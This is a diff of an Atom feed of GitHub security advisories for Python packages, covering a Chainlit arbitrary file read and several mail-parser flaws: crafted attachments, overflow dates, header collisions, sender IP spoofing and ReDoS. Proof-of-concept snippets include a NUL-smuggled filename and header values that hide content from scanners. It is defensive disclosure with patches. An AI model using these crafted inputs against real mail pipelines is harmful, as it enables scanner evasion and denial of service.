@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://prajeetguha.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-11-16T14:57:28.579Z</updated>
+    <updated>2026-11-16T23:41:21.394Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,1693 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[chainlit] chainlit : Chainlit allows authenticated arbitrary file reads through custom element updates]]></title>
+        <id>https://github.com/advisories/GHSA-gm79-2pvc-wc75</id>
+        <link href="https://github.com/advisories/GHSA-gm79-2pvc-wc75"/>
+        <updated>2026-11-16T22:36:32.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>chainlit</td>
+<td><code>&lt; 2.9.4</code></td>
+<td><code>2.9.4</code></td>
+</tr>
+</tbody>
+</table>
+<p>Chainlit versions prior to 2.9.4 contain an arbitrary file read vulnerability in the /project/element update flow. An authenticated client can send a custom Element with a user-controlled path value, causing the server to copy the referenced file into the attacker’s session. The resulting element identifier (chainlitKey) can then be used to retrieve the file contents via /project/file/, allowing disclosure of any file readable by the Chainlit service.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22218">https://nvd.nist.gov/vuln/detail/CVE-2026-22218</a></li>
+<li><a href="https://github.com/Chainlit/chainlit/releases/tag/2.9.4">https://github.com/Chainlit/chainlit/releases/tag/2.9.4</a></li>
+<li><a href="https://www.vulncheck.com/advisories/chainlit-arbitrary-file-read-via-project-element">https://www.vulncheck.com/advisories/chainlit-arbitrary-file-read-via-project-element</a></li>
+<li><a href="https://www.zafran.io/resources/chainleak-critical-ai-framework-vulnerabilities-expose-data-enable-cloud-takeover">https://www.zafran.io/resources/chainleak-critical-ai-framework-vulnerabilities-expose-data-enable-cloud-takeover</a></li>
+<li><a href="https://github.com/Chainlit/chainlit/pull/2737">https://github.com/Chainlit/chainlit/pull/2737</a></li>
+<li><a href="https://github.com/Chainlit/chainlit/commit/ffc3cce648b343b933e10e85ee5805c7e02ab3bf">https://github.com/Chainlit/chainlit/commit/ffc3cce648b343b933e10e85ee5805c7e02ab3bf</a></li>
+<li><a href="https://github.com/advisories/GHSA-gm79-2pvc-wc75">https://github.com/advisories/GHSA-gm79-2pvc-wc75</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gm79-2pvc-wc75</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-01-20T00:30:28.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mail-parser] mail-parser: One hostile attachment aborts `write_attachments()` and silently drops the rest of the batch]]></title>
+        <id>https://github.com/advisories/GHSA-8cgq-x343-p74c</id>
+        <link href="https://github.com/advisories/GHSA-8cgq-x343-p74c"/>
+        <updated>2026-11-16T22:23:34.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>mail-parser</td>
+<td><code>&gt;= 4.6.0, &lt; 4.6.3</code></td>
+<td><code>4.6.3</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="impact">Impact</h3>
+<p><code>write_attachments()</code> called <code>_safe_attachment_filename()</code> and <code>write_sample()</code> inside its loop
+with no guard, so a single crafted attachment raised out of the whole save. Every attachment
+<strong>after</strong> the malicious one was silently never written, with no error surfaced to a caller that
+catches only <code>MailParserError</code>.</p>
+<p>That is an evasion primitive as much as an availability bug: a sender puts one poisoned part
+first and the real payload second, and the payload never reaches the extraction directory that
+a downstream scanner or sandbox reads — while it still reaches the recipient's mail client
+intact. The tool's output diverges from the bytes actually in the message, which is the same
+failure mode as the filename-sanitizing bypass in
+<a href="https://github.com/SpamScope/mail-parser/security/advisories/GHSA-fr3h-cpq2-9496">GHSA-fr3h-cpq2-9496</a>.</p>
+<p>Three shapes were reachable, all from attacker-controlled MIME metadata:</p>
+<ul>
+<li><strong>NUL smuggled through RFC 2231</strong> — <code>filename*=us-ascii''evil%00.bin</code> decodes to a NUL in the
+filename during parsing and raised <code>ValueError</code> out of the name check;</li>
+<li><strong>overlong basename</strong> — a filename longer than <code>NAME_MAX</code> (e.g. 300 characters) raised
+<code>OSError: File name too long</code> from <code>open()</code>, <em>after</em> creating a zero-byte stub on disk;</li>
+<li><strong>undecodable payload</strong> — a body that is not valid base64 raised <code>binascii.Error</code> (a
+<code>ValueError</code> subclass) from the decode performed inside the <code>open()</code> block.</li>
+</ul>
+<pre><code class="language-python">import tempfile, mailparser
+
+raw = ("Content-Type: multipart/mixed; boundary=b\r\n\r\n"
+       "--b\r\nContent-Type: application/octet-stream\r\n"
+       "Content-Disposition: attachment; filename*=us-ascii''evil%00.bin\r\n\r\nxx\r\n"
+       "--b\r\nContent-Type: application/octet-stream\r\n"
+       "Content-Disposition: attachment; filename=good.bin\r\n\r\nyy\r\n"
+       "--b--\r\n")
+
+mp = mailparser.parse_from_string(raw)     # parse itself is fine; safe_filename is None
+mp.write_attachments(tempfile.mkdtemp())
+# 4.6.0 - 4.6.2 -&gt; ValueError, and good.bin is never written
+# 4.6.3         -&gt; logs "Skipped attachment with invalid filename: 'evil\x00.bin'";
+#                  good.bin is written
+</code></pre>
+<p><code>parse()</code> itself was never affected — it catches the <code>ValueError</code> — so only the write path was
+unguarded. The reject-paths that made this reachable were introduced with the filename
+sanitizing in 4.6.0 (PR #165).</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <strong>4.6.3</strong>. <code>write_attachments()</code> now logs and skips a single unusable attachment
+instead of aborting the batch:</p>
+<ul>
+<li>an invalid filename is caught and skipped;</li>
+<li>overlong basenames are truncated to 240 UTF-8 bytes, preserving the extension, rather than
+reaching <code>open()</code>;</li>
+<li>the base64 decode moved <em>before</em> <code>open()</code>, so a failure leaves no zero-byte stub, and it now
+repairs padding and alphabet errors the way mail clients do (matching <code>MIME::Base64</code> on 2008
+cases) — rejecting them let a sender append one character to make an attachment vanish from
+the extraction directory while it still reached the recipient;</li>
+<li><code>MailParserPathError</code> is deliberately <strong>not</strong> caught by the per-attachment handler: a
+containment failure is not a per-attachment problem, and path-containment checks now raise
+<code>MailParserPathError</code> instead of <code>ValueError</code> so the broader catch cannot swallow them.</li>
+</ul>
+<p>Deduplication was hardened in the same change: it reserves room for its own suffix marker
+(<code>write_sample()</code> sanitizes again, and the clamp there used to cut the marker back off,
+collapsing distinct attachments onto one file), resumes from the last used suffix per stem
+instead of rescanning from 1 (quadratic before — 16000 same-named attachments took 14 s, now
+milliseconds), and folds case, because APFS, exFAT and SMB collapse <code>Invoice.pdf</code> and
+<code>invoice.pdf</code>.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Upgrade to 4.6.3. If you cannot upgrade, do not call <code>write_attachments()</code> on untrusted mail;
+iterate <code>parser.attachments</code> yourself and write each attachment inside its own
+<code>try</code>/<code>except Exception</code>, skipping the ones whose <code>safe_filename</code> is <code>None</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/SpamScope/mail-parser/security/advisories/GHSA-8cgq-x343-p74c">https://github.com/SpamScope/mail-parser/security/advisories/GHSA-8cgq-x343-p74c</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-129301">https://nvd.nist.gov/vuln/detail/CVE-2026-129301</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/pull/171">https://github.com/SpamScope/mail-parser/pull/171</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/commit/11b894a0b8b3f11055a99caff118206138d1daba">https://github.com/SpamScope/mail-parser/commit/11b894a0b8b3f11055a99caff118206138d1daba</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/commit/e1d9fe6778045d6e2c44406bc8822e3464c1097f">https://github.com/SpamScope/mail-parser/commit/e1d9fe6778045d6e2c44406bc8822e3464c1097f</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/releases/tag/4.6.3">https://github.com/SpamScope/mail-parser/releases/tag/4.6.3</a></li>
+<li><a href="https://github.com/advisories/GHSA-8cgq-x343-p74c">https://github.com/advisories/GHSA-8cgq-x343-p74c</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8cgq-x343-p74c</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-11-16T22:22:13.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mail-parser] mail-parser: Uncaught `OverflowError` / `OSError` on an out-of-range `Received` date]]></title>
+        <id>https://github.com/advisories/GHSA-xhrq-2mqv-q8wx</id>
+        <link href="https://github.com/advisories/GHSA-xhrq-2mqv-q8wx"/>
+        <updated>2026-11-16T22:20:33.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>mail-parser</td>
+<td><code>&gt;= 3.7.0, &lt; 4.6.3</code></td>
+<td><code>4.6.3</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="impact">Impact</h3>
+<p>A <code>Received</code> header whose trailing date carries an out-of-range year, or a timezone offset
+large enough to push the timestamp past the int64 epoch range, raises an exception that is
+<strong>outside the <code>MailParser*</code> hierarchy</strong>. A caller that catches only mail-parser exceptions
+does not catch it, and the parse of the entire message is aborted — the same class of issue
+as <a href="https://github.com/SpamScope/mail-parser/security/advisories/GHSA-24mq-4vc6-2prf">GHSA-24mq-4vc6-2prf</a>,
+which this survives (it is not a duplicate; 24mq is fixed in 4.6.2 and this reproduces on 4.6.2).</p>
+<p>All entry points are affected: <code>parse_from_string()</code>, <code>parse_from_bytes()</code>, <code>parse_from_file()</code>,
+<code>parse_from_file_obj()</code> and the <code>mail-parser</code> CLI. The header is fully attacker-controlled and
+a single line is enough, so any pipeline that parses untrusted mail can be made to lose the
+message — and, if one worker handles a queue, to drop the batch.</p>
+<pre><code class="language-python">import mailparser
+
+raw = ("Received: from x ([1.2.3.4]) by mx.victim.com; "
+       "Tue, 7 Mar 292277026596 14:29:24 +0000\r\n\r\nbody\r\n")
+mailparser.parse_from_string(raw).mail_json
+# &lt;= 4.6.2 -&gt; OverflowError: signed integer is greater than maximum
+# 4.6.3    -&gt; parses; the unusable hop date is reported as "date_utc": null
+</code></pre>
+<p><strong>Root cause.</strong> <code>receiveds_format()</code> in <code>src/mailparser/utils.py</code> guarded the date conversion
+with <code>except (TypeError, ValueError)</code>, but <code>convert_mail_date()</code> → <code>email.utils.mktime_tz()</code> →
+<code>calendar.timegm()</code> raises <code>OverflowError</code> for years whose epoch seconds overflow int64, and
+<code>datetime.fromtimestamp()</code> reports <code>EOVERFLOW</code> as <code>OSError</code> for a sufficiently large timezone
+offset. The <code>date</code> and <code>timezone</code> properties already wrapped the same conversion in
+<code>except Exception</code>; only the <code>Received</code> path was left open.</p>
+<p><strong>Affected range.</strong> Introduced by the date-handling change in <code>ca2aa6a</code>, first released in
+3.7.0. Reproduced on PyPI 3.7.0, 3.8.0, 3.9.3, 4.0.0, 4.5.0, 4.6.0, 4.6.2 and on <code>master</code>
+before the fix (Python 3.14). 3.6.0 is not affected.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <strong>4.6.3</strong>. <code>receiveds_format()</code> now also catches <code>OverflowError</code> and <code>OSError</code> and
+records <code>date_utc = None</code> for that hop, so the rest of the message still parses:</p>
+<pre><code class="language-python">try:
+    j["date_utc"], _ = convert_mail_date(i["date"])
+except (TypeError, ValueError, OverflowError, OSError):
+    j["date_utc"] = None
+</code></pre>
+<p>A sweep of year magnitudes from 10^7 to 10^12 shows only <code>ValueError</code>, <code>OverflowError</code> and
+<code>OSError</code> are reachable on this path.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Upgrade to 4.6.3. If you cannot upgrade, wrap every <code>parse_from_*</code> call in a bare
+<code>except Exception</code> rather than <code>except MailParserError</code>, and treat the message as unparsed.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>Fix: <a href="https://github.com/SpamScope/mail-parser/pull/171">https://github.com/SpamScope/mail-parser/pull/171</a></li>
+<li>Related: <a href="https://github.com/SpamScope/mail-parser/security/advisories/GHSA-24mq-4vc6-2prf">GHSA-24mq-4vc6-2prf</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/SpamScope/mail-parser/security/advisories/GHSA-xhrq-2mqv-q8wx">https://github.com/SpamScope/mail-parser/security/advisories/GHSA-xhrq-2mqv-q8wx</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-129300">https://nvd.nist.gov/vuln/detail/CVE-2026-129300</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/pull/171">https://github.com/SpamScope/mail-parser/pull/171</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/commit/d69f6f9b6ad0bf74d731b373bbdeabb462c32b26">https://github.com/SpamScope/mail-parser/commit/d69f6f9b6ad0bf74d731b373bbdeabb462c32b26</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/commit/e1d9fe6778045d6e2c44406bc8822e3464c1097f">https://github.com/SpamScope/mail-parser/commit/e1d9fe6778045d6e2c44406bc8822e3464c1097f</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/releases/tag/4.6.3">https://github.com/SpamScope/mail-parser/releases/tag/4.6.3</a></li>
+<li><a href="https://github.com/advisories/GHSA-xhrq-2mqv-q8wx">https://github.com/advisories/GHSA-xhrq-2mqv-q8wx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xhrq-2mqv-q8wx</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-11-16T22:20:32.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mail-parser] mail-parser: Uncaught exceptions and silent header loss in mail-parser on attacker-controlled input]]></title>
+        <id>https://github.com/advisories/GHSA-24mq-4vc6-2prf</id>
+        <link href="https://github.com/advisories/GHSA-24mq-4vc6-2prf"/>
+        <updated>2026-11-16T22:12:52.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>mail-parser</td>
+<td><code>&lt;= 4.6.1</code></td>
+<td><code>4.6.2</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="impact">Impact</h3>
+<p>Two effects, sharing the root cause of Advisory 1 — header names chosen by the sender were
+resolved through Python attribute lookup and rewritten before lookup.</p>
+<p><strong>Uncaught exceptions.</strong> A crafted message raises an exception that is <em>outside</em> the
+<code>MailParser*</code> hierarchy, so a caller catching only mail-parser exceptions does not catch it
+and the worker dies.</p>
+<p><em>Header named after a method</em> (CWE-248, reported by @iam-niranjan). Python resolves real
+class attributes before <code>__getattr__</code>, so a header named after a method put a bound method
+object into the parsed mail dict. A 12-byte email is sufficient. Nine colliding names were
+confirmed: <code>Parse</code>, <code>Message</code>, <code>Write_Attachments</code>, <code>From_File</code>, <code>From_File_Obj</code>,
+<code>From_File_Msg</code>, <code>From_String</code>, <code>From_Bytes</code>, <code>Get_Server_Ipaddress</code>. Also reproducible from
+the CLI (<code>mail-parser -f evil.eml -j</code>).</p>
+<pre><code class="language-python">import mailparser
+mailparser.parse_from_string("Parse: x\r\n\r\n").mail_json
+# 4.6.1 -&gt; TypeError: Object of type method is not JSON serializable
+# 4.6.2 -&gt; {"parse": "x", "has_defects": false}
+</code></pre>
+<p><em>Header carrying 8-bit bytes</em> (CWE-248). For a header containing raw 8-bit bytes, Python's
+<code>compat32</code> policy returns an <code>email.header.Header</code> rather than a <code>str</code>, which the <code>_raw</code>
+accessor passed straight to <code>json.dumps</code>. This fires on entirely benign non-ASCII mail via
+<code>parse_from_bytes()</code>, the normal entry point for mail off the wire.</p>
+<pre><code class="language-python">import mailparser
+mailparser.parse_from_bytes(b"Subject: caf\xe9\r\n\r\nbody\r\n").subject_raw
+# 4.6.1 -&gt; TypeError: Object of type Header is not JSON serializable
+# 4.6.2 -&gt; '["caf�"]'
+</code></pre>
+<p><strong>Silent loss of message content</strong> (CWE-436). A sender can make a header's value vanish from
+every output surface, or be replaced by a different header's value, with <code>has_defects</code>
+remaining <code>false</code>. This is an evasion primitive: the tool's output diverges from the bytes
+actually in the message, and a pipeline scanning parsed output for indicators sees nothing
+and no failure signal.</p>
+<p>Header names were normalised before lookup — underscores folded to dashes, and <code>_json</code> /
+<code>_raw</code> suffixes interpreted — so a header genuinely named <code>Subject_json</code> was reported with
+the value of <code>Subject</code> and its own value discarded, and any header whose name contains an
+underscore resolved to nothing.</p>
+<pre><code class="language-python">import mailparser
+
+raw = ("From: Real Sender &lt;real@good.example&gt;\r\n"
+       "Subject: innocuous\r\n"
+       "Subject_json: MALWARE-C2 http://evil.example/payload.exe\r\n"
+       "X_Spam_Flag: YES\r\n\r\nbody\r\n")
+mail = mailparser.parse_from_string(raw)
+print(mail.mail["subject_json"])       # 4.6.1 -&gt; '"innocuous"'   4.6.2 -&gt; the real value
+print(mail.headers["X_Spam_Flag"])     # 4.6.1 -&gt; ''              4.6.2 -&gt; 'YES'
+print("MALWARE-C2" in mail.mail_json)  # 4.6.1 -&gt; False           4.6.2 -&gt; True
+print(mail.has_defects)                # both  -&gt; False
+</code></pre>
+<p>A related case: <code>email.message.Message.__len__</code> returns the header count, so a message with
+<strong>no headers</strong> is falsy. <code>parse()</code> returned before initialising state, and the unset
+attributes were then absorbed by <code>__getattr__</code> and answered as absent headers. Every
+property returned <code>''</code> — including <code>mail</code> and <code>attachments</code>, which are documented to return
+a <code>dict</code> and a <code>list</code> — with no error and no defect flag.</p>
+<pre><code class="language-python">import mailparser
+mail = mailparser.parse_from_string("Click http://evil.example/pay.exe now\r\n")
+print(repr(mail.body))         # 4.6.1 -&gt; ''    4.6.2 -&gt; the text
+print(repr(mail.attachments))  # 4.6.1 -&gt; ''    4.6.2 -&gt; []
+print(mail.has_defects)        # 4.6.1 -&gt; ''    4.6.2 -&gt; True
+</code></pre>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <strong>4.6.2</strong>. Upgrade with <code>pip install --upgrade mail-parser</code>.</p>
+<p>Header names taken from a message are now looked up literally — no attribute access, no
+case or separator folding, no suffix interpretation — so no header name can collide with a
+method or property, and no value can be substituted or dropped. 8-bit values are coerced to
+<code>str</code> before serialisation. Parser state is initialised before the message check, which now
+tests <code>is None</code>, and attribute names beginning with <code>_</code> raise <code>AttributeError</code> instead of
+being answered as headers.</p>
+<p><strong>Behaviour changes.</strong> Header names now appear in <code>mail</code> and <code>headers</code> exactly as sent, so a
+header named <code>X_Spam_Flag</code> keeps that name and its own value. <code>X_raw</code> always returns a JSON
+array — an absent header yields <code>[]</code> where 4.6.1 returned <code>null</code>.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>None for the data loss. For the uncaught exceptions, callers who cannot upgrade should wrap
+<code>mail_json</code>, <code>mail_partial_json</code>, <code>headers_json</code> and any <code>X_raw</code> access in a bare
+<code>except Exception</code> rather than catching only <code>MailParserError</code> subclasses.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/SpamScope/mail-parser/security/advisories/GHSA-24mq-4vc6-2prf">https://github.com/SpamScope/mail-parser/security/advisories/GHSA-24mq-4vc6-2prf</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-129299">https://nvd.nist.gov/vuln/detail/CVE-2026-129299</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/pull/167">https://github.com/SpamScope/mail-parser/pull/167</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/commit/ce3cf3559db1ff806bda598b378de9f8c2a5be96">https://github.com/SpamScope/mail-parser/commit/ce3cf3559db1ff806bda598b378de9f8c2a5be96</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/releases/tag/4.6.2">https://github.com/SpamScope/mail-parser/releases/tag/4.6.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-24mq-4vc6-2prf">https://github.com/advisories/GHSA-24mq-4vc6-2prf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-24mq-4vc6-2prf</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-11-16T22:12:51.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mail-parser] mail-parser: Sender IP address spoofing in get_server_ipaddress()]]></title>
+        <id>https://github.com/advisories/GHSA-72px-j8gh-p79x</id>
+        <link href="https://github.com/advisories/GHSA-72px-j8gh-p79x"/>
+        <updated>2026-11-16T22:11:55.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>mail-parser</td>
+<td><code>&lt;= 4.6.1</code></td>
+<td><code>4.6.2</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <strong>4.6.2</strong>. Upgrade with <code>pip install --upgrade mail-parser</code>.</p>
+<p>Candidate addresses are now selected by position, not by appearance — a bracketed address
+the sender wrote is byte-identical to one the MTA wrote, so no amount of pattern matching
+can tell them apart:</p>
+<ul>
+<li>the first token of the <code>from</code> clause is the HELO name, whatever its shape, and is never a
+candidate;</li>
+<li>an explicit HELO marker inside a comment group is sender text and is excluded;</li>
+<li>a candidate must sit inside a <code>(</code> / <code>[</code> group;</li>
+<li>IPv4 and IPv6 matches are merged positionally, never family-first;</li>
+<li>the walk stops at the first trusted hop naming no address, rather than continuing into
+sender-written headers.</li>
+</ul>
+<p>The IPv6 pattern was corrected to skip the <code>IPv6:</code> tag and to prefer the longest valid form.</p>
+<p><strong>Behaviour change.</strong> <code>get_server_ipaddress()</code> now returns <code>None</code> rather than an unreliable
+value in two cases that previously returned an address: a <code>from</code> clause consisting of a bare
+address with no HELO marker (indistinguishable from <code>EHLO &lt;that address&gt;</code>), and a trusted hop
+naming no address at all. Callers must handle <code>None</code>.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>None within mail-parser. Callers who cannot upgrade should not treat the return value of
+<code>get_server_ipaddress()</code> as trustworthy, and should derive sender attribution from an
+authenticated signal instead — the MTA's own logs, or SPF/DKIM/DMARC results computed
+outside this library.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/SpamScope/mail-parser/security/advisories/GHSA-72px-j8gh-p79x">https://github.com/SpamScope/mail-parser/security/advisories/GHSA-72px-j8gh-p79x</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-129297">https://nvd.nist.gov/vuln/detail/CVE-2026-129297</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/pull/167">https://github.com/SpamScope/mail-parser/pull/167</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/commit/ce3cf3559db1ff806bda598b378de9f8c2a5be96">https://github.com/SpamScope/mail-parser/commit/ce3cf3559db1ff806bda598b378de9f8c2a5be96</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/releases/tag/4.6.2">https://github.com/SpamScope/mail-parser/releases/tag/4.6.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-72px-j8gh-p79x">https://github.com/advisories/GHSA-72px-j8gh-p79x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-72px-j8gh-p79x</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-11-16T22:11:54.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mail-parser] mail-parser is vulnerable to polynomial ReDoS in email header parsing]]></title>
+        <id>https://github.com/advisories/GHSA-r7w7-vpq8-c5vv</id>
+        <link href="https://github.com/advisories/GHSA-r7w7-vpq8-c5vv"/>
+        <updated>2026-11-16T22:11:09.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>mail-parser</td>
+<td><code>&gt;= 4.2.0, &lt; 4.6.1</code></td>
+<td><code>4.6.1</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="summary">Summary</h3>
+<p>Two regular expressions used while parsing email headers backtrack
+polynomially on attacker-controlled input. Parsing a single small, well-formed
+email can consume minutes to hours of CPU, denying service to any process that
+parses untrusted mail.</p>
+<p>Both are reachable from an ordinary <code>parse_from_string()</code>, <code>parse_from_bytes()</code>
+or <code>parse_from_file()</code> call — no special API, option, or malformed structure is
+required by the victim.</p>
+<h3 id="details">Details</h3>
+<p><strong>1. Address-header fallback regex (<code>src/mailparser/utils.py</code>)</strong></p>
+<p><code>get_addresses()</code> falls back to <code>_ADDR_FALLBACK_RE</code> whenever
+<code>email.utils.getaddresses(strict=True)</code> yields no usable address. The
+alternative <code>([^&lt;,]*?)\s*&lt;([^&gt;]+)&gt;</code> overlaps a lazy quantifier with an adjacent
+<code>\s*</code> — a space matches both. Driven by <code>finditer</code>, which retries at every
+offset and rescans the remainder, matching degrades to <strong>quadratic</strong> on <code>&lt;</code>
+padding and <strong>cubic</strong> on whitespace padding.</p>
+<p>The fallback engages on the feature's own happy path, e.g.
+<code>From: alice@example.com &lt;bob@example.com&gt;</code>.</p>
+<p>Measured (4.6.0, CPython 3.14, macOS arm64; reproduced identically on Linux and
+on CPython 3.9, 3.11, 3.12, 3.13):</p>
+<table>
+<thead>
+<tr>
+<th>Padding</th>
+<th>Parse time</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>valid address + 750 sp</td>
+<td>0.38 s</td>
+</tr>
+<tr>
+<td>+ 1500 sp</td>
+<td>2.97 s</td>
+</tr>
+<tr>
+<td>+ 3000 sp</td>
+<td>23.4 s (×7.9/2×)</td>
+</tr>
+<tr>
+<td>+ 6 KB sp</td>
+<td>185 s</td>
+</tr>
+<tr>
+<td>~100 KB sp</td>
+<td>hours</td>
+</tr>
+</tbody></table>
+<p>Fully RFC 5322-compliant folded headers (all lines ≤ 71 octets) trigger the same
+blowup, so the input passes normal MTA and library checks. ~100 KB of headers is
+within Postfix's default <code>header_size_limit = 102400</code>.</p>
+<p>All six address headers parsed by the library (<code>From</code>, <code>To</code>, <code>Cc</code>, <code>Bcc</code>,
+<code>Reply-To</code>, <code>Delivered-To</code>) are affected and their cost adds up linearly.</p>
+<p><strong>2. Received-header clause splitter (<code>src/mailparser/const.py</code>)</strong></p>
+<p><code>parse_received()</code> splits on <code>_CLAUSE_SPLITTER</code>,
+<code>(?:^|\s+)(from|by|via|with|id|for|envelope-from)\s+</code>. Under <code>re.split</code> this
+backtracks <strong>quadratically</strong> over any whitespace run that is not followed by a
+clause keyword. The pre-existing normalization collapsed only <code>[\t\n]</code>, so
+literal spaces — including folded-header padding — reached the splitter intact.</p>
+<p>Measured: 24 000 spaces in one <code>Received:</code> header → 22 s; ~100 KB → minutes.</p>
+<h3 id="impact">Impact</h3>
+<p>Availability. A handful of small emails keeps every parsing worker of a mail
+gateway, ticketing system, quarantine UI, or archiving pipeline permanently
+busy. No confidentiality or integrity impact.</p>
+<p>Anyone who parses email they did not author is affected — which is the library's
+purpose.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <strong>4.6.1</strong>.</p>
+<ul>
+<li>The address fallback is now a linear scan: the header is split into
+comma-separated items (quote-aware, in Python), then each item is matched
+against a bounded angle-address <code>&lt;([^&lt;&gt;\s]+)&gt;</code> with the display name derived
+in Python, falling back to a bare-email match. Each pattern has a single
+non-nested quantifier over a negated character class → O(n).
+2000 padding spaces: <code>3.5 s → &lt;0.01 s</code>. 256 KB padding: <code>hours → 0.087 s</code>.
+Output is preserved on every previously supported shape.</li>
+<li><code>parse_received()</code> collapses whitespace runs to a single space before
+splitting, so the splitter's <code>\s+</code> only ever matches one character → O(n).
+The date is extracted from the raw header beforehand, so date formatting is
+unaffected. 24 000 spaces: <code>22 s → 0.003 s</code>; 200 000 spaces: <code>0.004 s</code>.</li>
+</ul>
+<p>Regression tests assert linear-time behaviour for both paths.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>None within the library. Upgrade to <code>4.6.1</code>.</p>
+<p>Users who cannot upgrade immediately should cap total header size before
+parsing and enforce a wall-clock timeout around each parse.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/SpamScope/mail-parser/security/advisories/GHSA-r7w7-vpq8-c5vv">https://github.com/SpamScope/mail-parser/security/advisories/GHSA-r7w7-vpq8-c5vv</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-129295">https://nvd.nist.gov/vuln/detail/CVE-2026-129295</a></li>
+<li><a href="https://github.com/SpamScope/mail-parser/pull/166">https://github.com/SpamScope/mail-parser/pull/166</a></li>
